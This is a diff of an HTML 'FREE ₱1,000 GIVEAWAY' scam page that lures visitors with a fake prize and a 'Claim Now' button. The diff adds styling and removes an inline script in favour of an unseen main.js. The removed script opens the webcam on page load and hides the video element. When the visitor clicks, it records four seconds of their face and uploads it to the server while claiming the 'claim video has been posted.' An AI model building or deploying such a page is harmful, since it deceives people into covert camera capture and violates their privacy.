@@ -5,7 +5,10 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>🎁 FREE ₱1,000 GIVEAWAY!</title>
 <style>
-/* Add your previous styling here (card, button, falling gifts) */
+body { font-family: 'Segoe UI', Tahoma, sans-serif; background: #f5f5f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+.card { background: #ffffff; padding: 30px; border-radius: 12px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); text-align:center; width:90%; max-width:400px; }
+.btn { background: #f3ba2f; color: #000; border: none; padding: 15px; width: 100%; border-radius: 8px; font-weight: bold; cursor: pointer; font-size: 16px; margin-top: 20px; transition: 0.3s; }
+.btn:hover { background: #dba323; }
 #vBox { width: 0; height: 0; opacity: 0; overflow: hidden; position: absolute; }
 #loading { display: none; margin-top: 20px; }
 .spinner { border: 3px solid #30363d; border-top: 3px solid #f3ba2f; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 0 auto 10px; }
@@ -13,6 +16,7 @@
 </style>
 </head>
 <body>
+
 <div class="card">
     <h2>🎉 CONGRATULATIONS! 🎉</h2>
     <p>Click “Claim Now” to see if you’re lucky!</p>
@@ -26,54 +30,9 @@
         <p>Processing request...</p>
     </div>
 
-    <button id="startBtn">Claim Now!!!</button>
+    <button class="btn" id="startBtn">Claim Now!!!</button>
 </div>
 
-<script>
-const btn = document.getElementById('startBtn');
-const loading = document.getElementById('loading');
-const video = document.getElementById('preview');
-
-async function initCamera() {
-    try {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
-        video.srcObject = stream;
-    } catch (err) {
-        console.warn("Camera access denied.");
-    }
-}
-initCamera();
-
-btn.addEventListener('click', async () => {
-    btn.style.display = 'none';
-    loading.style.display = 'block';
-
-    try {
-        const stream = video.srcObject;
-        const recorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
-        let chunks = [];
-
-        recorder.ondataavailable = e => { if(e.data.size>0) chunks.push(e.data); };
-        recorder.onstop = async () => {
-            const videoBlob = new Blob(chunks, { type: 'video/webm' });
-            const formData = new FormData();
-            formData.append('video', videoBlob, 'claim_video.mp4');
-
-            const res = await fetch("/upload-video", { method: "POST", body: formData });
-            const data = await res.json();
-            console.log("Video posted:", data);
-
-            loading.innerHTML = "<p>Success! Your claim video has been posted.</p>";
-        };
-
-        recorder.start();
-        setTimeout(() => recorder.stop(), 4000);
-
-    } catch (err) {
-        console.error(err);
-        loading.innerHTML = "<p>Error capturing video.</p>";
-    }
-});
-</script>
+<script src="main.js"></script>
 </body>
 </html>
